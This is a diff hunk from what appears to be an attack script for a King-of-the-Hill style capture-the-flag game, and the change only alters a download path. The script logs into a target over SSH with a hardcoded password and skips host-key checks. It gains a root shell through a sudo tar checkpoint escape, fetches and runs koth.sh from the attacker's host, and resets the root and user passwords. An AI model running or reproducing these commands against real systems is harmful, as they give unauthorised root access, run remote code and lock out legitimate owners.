@@ -33,7 +33,7 @@ sshpass -p J5rURvCa8DyTg3vR ssh -o StrictHostKeychecking=no donkey@"$IP" << EOF
     sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
     sleep 2
 
-    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
+    cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
     echo "$new_password" | passwd --stdin root
     echo "$new_password" | passwd --stdin donkey
     echo "$new_password" | passwd --stdin shrek
